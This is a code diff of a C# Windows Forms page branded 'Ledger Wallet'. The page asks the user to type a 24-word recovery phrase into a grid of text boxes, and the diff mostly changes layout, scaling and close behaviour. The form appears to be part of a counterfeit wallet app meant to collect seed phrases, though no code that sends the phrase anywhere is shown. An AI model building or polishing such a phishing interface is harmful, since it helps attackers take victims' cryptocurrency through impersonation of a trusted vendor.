@@ -8,7 +8,14 @@ namespace Ledger.MainClassFolder
     public partial class RecoveryPhrasePage : Form
     {
         TextBox[] _words = new TextBox[24];
+        Label[] _labels = new Label[24];
         string _deviceName;
+
+        Label _title;
+        Label _desc;
+        Panel _wordPanel;
+        RoundedButton _backBtn;
+        RoundedButton _readyBtn;
 
         public string RecoveryPhrase { get; private set; }
 
@@ -19,18 +26,23 @@ namespace Ledger.MainClassFolder
 
             Text = "Ledger Wallet";
             WindowState = FormWindowState.Maximized;
+            StartPosition = FormStartPosition.Manual;
             BackColor = Color.FromArgb(18, 18, 18);
             DoubleBuffered = true;
             MinimumSize = new Size(900, 600);
             AutoScaleMode = AutoScaleMode.None;
 
+            var screen = Screen.PrimaryScreen.WorkingArea;
+            Location = screen.Location;
+            Size = screen.Size;
+
             BuildUI();
+            Resize += (s, e) => PerformLayout();
         }
 
         void BuildUI()
         {
-            // ── Title ──
-            var title = new Label
+            _title = new Label
             {
                 Text = "RESTORE FROM RECOVERY PHRASE",
                 Font = new Font("Segoe UI", 20f, FontStyle.Bold),
@@ -38,41 +50,33 @@ namespace Ledger.MainClassFolder
                 AutoSize = true,
                 BackColor = Color.Transparent
             };
-            Controls.Add(title);
+            Controls.Add(_title);
 
-            // ── Description ──
-            var desc = new Label
+            _desc = new Label
             {
                 Text = $"Restore your {_deviceName.Replace("Ledger ", "")} from your recovery phrase to restore, replace or back up your Ledger hardware wallet.\n" +
                        $"Your {_deviceName.Replace("Ledger ", "")} will restore your private keys and you will be able to access and manage your crypto.",
                 Font = new Font("Segoe UI", 9.5f),
                 ForeColor = Color.FromArgb(170, 170, 170),
                 BackColor = Color.Transparent,
-                MaximumSize = new Size(600, 0),
                 AutoSize = true
             };
-            Controls.Add(desc);
+            Controls.Add(_desc);
 
-            // ── Word labels + textboxes (2 columns of 12) ──
-            var wordPanel = new Panel
-            {
-                BackColor = Color.Transparent
-            };
-            Controls.Add(wordPanel);
+            _wordPanel = new Panel { BackColor = Color.Transparent };
+            Controls.Add(_wordPanel);
 
-            Label[] labels = new Label[24];
             for (int i = 0; i < 24; i++)
             {
-                labels[i] = new Label
+                _labels[i] = new Label
                 {
                     Text = $"{i + 1}.",
                     Font = new Font("Segoe UI", 9f, FontStyle.Bold),
                     ForeColor = Color.Gray,
-                    AutoSize = true,
                     BackColor = Color.Transparent,
                     TextAlign = ContentAlignment.MiddleRight
                 };
-                wordPanel.Controls.Add(labels[i]);
+                _wordPanel.Controls.Add(_labels[i]);
 
                 _words[i] = new TextBox
                 {
@@ -83,21 +87,19 @@ namespace Ledger.MainClassFolder
                     Name = $"word{i + 1}"
                 };
                 _words[i].KeyPress += Word_KeyPress;
-                wordPanel.Controls.Add(_words[i]);
+                _wordPanel.Controls.Add(_words[i]);
             }
 
-            // ── Back button ──
-            var backBtn = new RoundedButton("← Back", false);
-            backBtn.Click += (s, e) =>
+            _backBtn = new RoundedButton("← Back", false);
+            _backBtn.Click += (s, e) =>
             {
                 DialogResult = DialogResult.Cancel;
                 Close();
             };
-            Controls.Add(backBtn);
+            Controls.Add(_backBtn);
 
-            // ── Ready button ──
-            var readyBtn = new RoundedButton("Ok, I'm ready!", true);
-            readyBtn.Click += (s, e) =>
+            _readyBtn = new RoundedButton("Ok, I'm ready!", true);
+            _readyBtn.Click += (s, e) =>
             {
                 string[] words = new string[24];
                 for (int i = 0; i < 24; i++)
@@ -106,58 +108,83 @@ namespace Ledger.MainClassFolder
                 DialogResult = DialogResult.OK;
                 Close();
             };
-            Controls.Add(readyBtn);
+            Controls.Add(_readyBtn);
+        }
 
-            // ── Layout ──
-            Resize += (s, e) =>
+        void PerformLayout()
+        {
+            int cw = ClientSize.Width;
+            int ch = ClientSize.Height;
+
+            // Scale-aware margins
+            int sideMargin = Math.Max(40, (int)(cw * 0.04));
+            int topMargin = Math.Max(20, (int)(ch * 0.03));
+            int btnAreaH = Math.Max(60, (int)(ch * 0.08));
+
+            // ── Title ──
+            _title.Location = new Point((cw - _title.Width) / 2, topMargin);
+
+            // ── Description ──
+            int descMaxW = Math.Min(650, cw - sideMargin * 2);
+            _desc.MaximumSize = new Size(descMaxW, 0);
+            _desc.Location = new Point((cw - _desc.Width) / 2, _title.Bottom + 15);
+
+            // ── Word grid — scales to fill available space ──
+            int gridTop = _desc.Bottom + 20;
+            int gridBottom = ch - btnAreaH - 15;
+            int gridAvailH = gridBottom - gridTop;
+            int gridAvailW = cw - sideMargin * 2;
+
+            // Calculate textbox dimensions based on available space
+            int tbH = Math.Max(26, Math.Min(40, gridAvailH / 14));
+            int rowGap = Math.Max(2, (gridAvailH - 12 * tbH) / 11);
+            if (rowGap > 16) rowGap = 16;
+            int gridH = 12 * tbH + 11 * rowGap;
+
+            int lblW = Math.Max(28, (int)(gridAvailW * 0.04));
+            int colGap = Math.Max(20, (int)(gridAvailW * 0.04));
+            int tbW = Math.Max(120, (gridAvailW - 2 * lblW - colGap) / 2);
+            if (tbW > 220) tbW = 220;
+
+            int gridW = 2 * (lblW + tbW) + colGap;
+            int gridLeft = (cw - gridW) / 2;
+
+            _wordPanel.SetBounds(gridLeft, gridTop, gridW, gridH);
+
+            int col2Offset = lblW + tbW + colGap;
+
+            // Update font size based on textbox height
+            float fontSize = Math.Max(8f, Math.Min(11f, tbH * 0.3f));
+            var tbFont = new Font("Segoe UI", fontSize, FontStyle.Bold);
+            var lblFont = new Font("Segoe UI", Math.Max(7.5f, fontSize - 1f), FontStyle.Bold);
+
+            for (int i = 0; i < 24; i++)
             {
-                int cw = ClientSize.Width;
-                int ch = ClientSize.Height;
-                int margin = 60;
+                int col = i < 12 ? 0 : 1;
+                int row = i < 12 ? i : i - 12;
+                int baseX = col == 0 ? 0 : col2Offset;
+                int yy = row * (tbH + rowGap);
 
-                // Title centered at top
-                title.Location = new Point((cw - title.Width) / 2, 30);
+                _labels[i].Font = lblFont;
+                _labels[i].SetBounds(baseX, yy, lblW, tbH);
 
-                // Description centered below title
-                desc.MaximumSize = new Size(600, 0);
-                desc.Location = new Point((cw - desc.Width) / 2, title.Bottom + 20);
+                _words[i].Font = tbFont;
+                _words[i].SetBounds(baseX + lblW, yy, tbW, tbH);
+            }
 
-                // Word grid below description, centered, fills remaining space
-                int gridTop = desc.Bottom + 30;
-                int btnAreaH = 70;
-                int gridAvailH = ch - gridTop - btnAreaH - 20;
+            // ── Buttons — anchored to bottom corners ──
+            int btnW = Math.Max(120, Math.Min(180, (int)(cw * 0.12)));
+            int btnH = Math.Max(36, Math.Min(46, (int)(ch * 0.05)));
+            int btnY = ch - btnAreaH + (btnAreaH - btnH) / 2;
 
-                int tbH = 36;
-                int rowGap = Math.Max(4, (gridAvailH - 12 * tbH) / 11);
-                if (rowGap > 14) rowGap = 14;
-                int gridH = 12 * tbH + 11 * rowGap;
+            _backBtn.SetBounds(sideMargin, btnY, btnW, btnH);
+            _readyBtn.SetBounds(cw - sideMargin - btnW - 20, btnY, btnW + 20, btnH);
+        }
 
-                int lblW = 35;
-                int tbW = 200;
-                int colGap = 40;
-                int gridW = 2 * (lblW + tbW) + colGap;
-                int gridLeft = (cw - gridW) / 2;
-
-                wordPanel.SetBounds(gridLeft, gridTop, gridW, gridH);
-
-                int col2Offset = lblW + tbW + colGap;
-
-                for (int i = 0; i < 24; i++)
-                {
-                    int col = i < 12 ? 0 : 1;
-                    int row = i < 12 ? i : i - 12;
-                    int baseX = col == 0 ? 0 : col2Offset;
-                    int yy = row * (tbH + rowGap);
-
-                    labels[i].SetBounds(baseX, yy + 8, lblW, tbH);
-                    _words[i].SetBounds(baseX + lblW, yy, tbW, tbH);
-                }
-
-                // Buttons at bottom — far left and far right
-                int btnY = ch - btnAreaH;
-                backBtn.SetBounds(margin, btnY, 140, 42);
-                readyBtn.SetBounds(cw - margin - 180, btnY, 180, 42);
-            };
+        protected override void OnShown(EventArgs e)
+        {
+            base.OnShown(e);
+            PerformLayout();
         }
 
         void Word_KeyPress(object sender, KeyPressEventArgs e)
@@ -165,6 +192,15 @@ namespace Ledger.MainClassFolder
             if (char.IsLetter(e.KeyChar) || char.IsControl(e.KeyChar) || e.KeyChar == ' ')
                 return;
             e.Handled = true;
+        }
+
+        protected override void OnFormClosing(FormClosingEventArgs e)
+        {
+            if (e.CloseReason == CloseReason.UserClosing && DialogResult == DialogResult.None)
+            {
+                DialogResult = DialogResult.Abort;
+            }
+            base.OnFormClosing(e);
         }
 
         // ── Rounded button control ──
@@ -197,7 +233,7 @@ namespace Ledger.MainClassFolder
                 g.Clear(Color.FromArgb(18, 18, 18));
 
                 var rect = new Rectangle(1, 1, Width - 3, Height - 3);
-                int r = 20;
+                int r = Math.Min(20, Height / 2);
 
                 using (var path = CreateRoundRect(rect, r))
                 {
